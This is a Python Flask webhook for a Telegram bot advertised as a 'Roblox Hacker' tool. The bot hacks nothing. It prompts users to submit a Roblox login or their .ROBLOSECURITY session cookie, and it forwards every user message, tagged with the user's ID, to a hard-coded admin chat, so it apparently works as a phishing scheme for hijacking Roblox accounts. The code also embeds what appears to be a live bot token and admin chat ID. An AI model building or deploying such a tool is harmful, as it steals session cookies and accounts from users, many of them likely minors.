from flask import Flask, request
import requests
import os
import json
import re

app = Flask(__name__)

BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
ADMIN_CHAT_ID = "8625787020"
VIDEO_FILE_ID = "BAACAgEAAxkBAAP7akugXF318MJWQ3616dZDkwJJ4hkAAnEHAALuAmBGFLl3swomiE88BA"

# === ФАЙЛЫ ===
USERS_FILE = "users.json"
LANG_FILE = "lang.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

user_lang = load_json(LANG_FILE)

def save_lang():
    save_json(LANG_FILE, user_lang)

# === ТЕКСТЫ ===
TEXTS = {
    "ru": {
        "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Инструмент для анализа аккаунтов Roblox\n▸ Получение куки и данных сессии\n▸ Быстрая обработка запросов\n\n📌 *Выберите действие:*",
        "tutor": "📹 *Вот ваш видео-урок по взлому!*",
        "hack": "🎯 *Введите логин или .ROBLOSECURITY куки аккаунта:*\n\n▸ Данные будут обработаны в течение 5-10 минут",
        "cookies": "📋 *Отправьте .ROBLOSECURITY куки в формате:*\n\n`_|WARNING:-DO-NOT-SHARE-THIS.--...|_`\n\n▸ Куки будут проверены на валидность",
        "support": "📩 *Напишите ваш запрос. Администратор ответит в ближайшее время.*",
        "choose_lang": "🌐 *Выберите язык:*",
        "lang_changed": "✅ *Язык изменён.*",
        "reply_sent": "✅ *Ответ отправлен*",
        "choose_action": "📌 *Выберите действие:*",
        "admin_reply": "📨 *Ответ поддержки:*\n",
        "no_user": "⚠️ *Зажми сообщение с ID пользователя → Ответить*\n\n*Или используй команду:* `/reply ID Текст`"
    },
    "en": {
        "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Tool for Roblox account analysis\n▸ Cookie and session data extraction\n▸ Fast request processing\n\n📌 *Choose an action:*",
        "tutor": "📹 *Here's your hacking video tutorial!*",
        "hack": "🎯 *Enter login or .ROBLOSECURITY cookie:*\n\n▸ Data will be processed within 5-10 minutes",
        "cookies": "📋 *Send .ROBLOSECURITY cookie in format:*\n\n`_|WARNING:-DO-NOT-SHARE-THIS.--...|_`\n\n▸ Cookies will be validated",
        "support": "📩 *Write your request. Admin will reply soon.*",
        "choose_lang": "🌐 *Choose language:*",
        "lang_changed": "✅ *Language changed.*",
        "reply_sent": "✅ *Reply sent*",
        "choose_action": "📌 *Choose action:*",
        "admin_reply": "📨 *Support reply:*\n",
        "no_user": "⚠️ *Long press message with user ID → Reply*\n\n*Or use command:* `/reply ID Text`"
    }
}

# === КЛАВИАТУРЫ ===
LANG_KEYBOARD = {
    "keyboard": [
        ["🇷🇺 Русский", "🇬🇧 English"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

MAIN_KEYBOARD_RU = {
    "keyboard": [
        ["🎥 Видео-урок", "🎯 Взломать аккаунт"],
        ["📋 Получить куки", "📩 Написать поддержку"],
        ["🌐 Сменить язык"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

MAIN_KEYBOARD_EN = {
    "keyboard": [
        ["🎥 Video tutorial", "🎯 Hack account"],
        ["📋 Get cookies", "📩 Write to support"],
        ["🌐 Change language"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

@app.route('/')
def home():
    return "Bot is alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '')
        username = data['message']['from'].get('username', 'anon')
        user_id = data['message']['from']['id']

        # === АДМИН ===
        if str(chat_id) == ADMIN_CHAT_ID:
            # === ОТВЕТ ЧЕРЕЗ REPLY_TO_MESSAGE ===
            reply_to = data['message'].get('reply_to_message')
            if reply_to:
                reply_text = reply_to.get('text', '')
                # Ищем ID в сообщении (формат: ID: 123456789)
                match = re.search(r'ID:\s*(\d+)', reply_text)
                if match:
                    target_id = int(match.group(1))
                    target_lang = user_lang.get(str(target_id), "ru")
                    # Отправляем ответ пользователю
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": target_id,
                            "text": TEXTS[target_lang]["admin_reply"] + text,
                            "parse_mode": "Markdown"
                        }
                    )
                    # Подтверждение админу
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": f"✅ *Ответ отправлен* (ID: {target_id})",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200
                else:
                    # Если в сообщении нет ID — пробуем найти через /reply
                    if text.startswith("/reply "):
                        parts = text.split(" ", 2)
                        if len(parts) >= 3 and parts[1].isdigit():
                            target_id = int(parts[1])
                            reply_text = parts[2]
                            target_lang = user_lang.get(str(target_id), "ru")
                            requests.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                json={
                                    "chat_id": target_id,
                                    "text": TEXTS[target_lang]["admin_reply"] + reply_text,
                                    "parse_mode": "Markdown"
                                }
                            )
                            requests.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                json={
                                    "chat_id": ADMIN_CHAT_ID,
                                    "text": f"✅ *Ответ отправлен* (ID: {target_id})",
                                    "parse_mode": "Markdown"
                                }
                            )
                            return "ok", 200
                    # Если ничего не подошло
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": "⚠️ *Не удалось найти ID. Зажми сообщение с ID → Ответить*",
                            "parse_mode": "Markdown"
                        }
                    )
                    return "ok", 200

            # === ЕСЛИ ПРОСТО ТЕКСТ (БЕЗ ОТВЕТА) ===
            if text and not text.startswith("/"):
                # Проверяем, может это команда /reply без ответа
                if text.startswith("/reply "):
                    parts = text.split(" ", 2)
                    if len(parts) >= 3 and parts[1].isdigit():
                        target_id = int(parts[1])
                        reply_text = parts[2]
                        target_lang = user_lang.get(str(target_id), "ru")
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": target_id,
                                "text": TEXTS[target_lang]["admin_reply"] + reply_text,
                                "parse_mode": "Markdown"
                            }
                        )
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": ADMIN_CHAT_ID,
                                "text": f"✅ *Ответ отправлен* (ID: {target_id})",
                                "parse_mode": "Markdown"
                            }
                        )
                        return "ok", 200
                    else:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": ADMIN_CHAT_ID,
                                "text": "⚠️ *Используй:* `/reply ID Текст`",
                                "parse_mode": "Markdown"
                            }
                        )
                        return "ok", 200
                
                # Если это не команда — напоминаем, как правильно
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": TEXTS["ru"]["no_user"],
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            # === КОМАНДЫ ===
            if text == '/start':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": "👋 *Привет, админ!*\n\n▸ Бот Roblox Hacker работает\n▸ Зажми сообщение с ID → Ответить\n▸ Используй /help для списка команд",
                        "parse_mode": "Markdown",
                        "reply_markup": MAIN_KEYBOARD_RU
                    }
                )
                return "ok", 200

            if text == '/help':
                help_text = (
                    "📋 *Команды:*\n\n"
                    "/help — помощь\n"
                    "/users — количество пользователей\n"
                    "/reply ID Текст — ответить пользователю\n"
                    "/sendall Текст — рассылка\n\n"
                    "📌 *Зажми сообщение с ID → Ответить*\n"
                    "📌 *Просто текст без ответа — НЕ отправляется*"
                )
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": help_text,
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text == '/users':
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"👥 *Всего пользователей:* {len(USERS)}",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            if text.startswith("/sendall "):
                msg = text.replace("/sendall ", "")
                for uid in USERS:
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={"chat_id": uid, "text": msg}
                        )
                    except:
                        pass
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": ADMIN_CHAT_ID,
                        "text": f"✅ *Рассылка отправлена* {len(USERS)} пользователям.",
                        "parse_mode": "Markdown"
                    }
                )
                return "ok", 200

            # === ВСЁ ОСТАЛЬНОЕ (если не подошло) ===
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": ADMIN_CHAT_ID,
                    "text": TEXTS["ru"]["no_user"],
                    "parse_mode": "Markdown"
                }
            )
            return "ok", 200

        # === ПОЛЬЗОВАТЕЛЬ ===
        save_user(user_id)
        lang = user_lang.get(str(user_id), "ru")
        t = TEXTS[lang]

        # Смена языка
        if text in ["🌐 Сменить язык", "🌐 Change language"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_lang"],
                    "reply_markup": LANG_KEYBOARD
                }
            )
            return "ok", 200

        if text == "🇷🇺 Русский":
            user_lang[str(user_id)] = "ru"
            save_lang()
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["ru"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_RU
                }
            )
            return "ok", 200

        if text == "🇬🇧 English":
            user_lang[str(user_id)] = "en"
            save_lang()
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": TEXTS["en"]["lang_changed"],
                    "parse_mode": "Markdown",
                    "reply_markup": MAIN_KEYBOARD_EN
                }
            )
            return "ok", 200

        # === ПЕРЕСЫЛКА СООБЩЕНИЯ АДМИНУ С ID ===
        admin_msg = f"ID: {user_id}\n{text}"
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": admin_msg,
                "parse_mode": "Markdown"
            }
        )

        # === ОБРАБОТКА КНОПОК ===
        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU

        if text == '/start':
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["welcome"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["🎥 Видео-урок", "🎥 Video tutorial"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                json={
                    "chat_id": chat_id,
                    "video": VIDEO_FILE_ID,
                    "caption": t["tutor"],
                    "parse_mode": "Markdown"
                }
            )
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_action"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["🎯 Взломать аккаунт", "🎯 Hack account"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["hack"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["📋 Получить куки", "📋 Get cookies"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["cookies"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        elif text in ["📩 Написать поддержку", "📩 Write to support"]:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["support"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

        else:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": t["choose_action"],
                    "parse_mode": "Markdown",
                    "reply_markup": keyboard
                }
            )

    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
